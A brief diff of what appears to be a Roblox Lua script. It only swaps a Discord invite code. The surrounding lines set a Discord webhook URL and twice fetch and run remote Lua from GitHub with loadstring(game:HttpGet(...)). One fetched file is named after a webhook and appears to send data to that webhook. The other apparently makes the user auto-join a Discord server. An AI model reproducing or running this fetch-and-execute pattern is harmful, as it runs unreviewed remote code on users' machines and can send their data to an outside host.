@@ -3,7 +3,7 @@ getgenv().WebhookHere = "https://discord.com/api/webhooks/1027099696856059925/mh
  
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
 
-getgenv().InviteCode = "C3R9fuXc" 
+getgenv().InviteCode = "bNg5mKa4" 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/toidqwe/Roblox/main/discord%20auto%20join.lua"))()
 
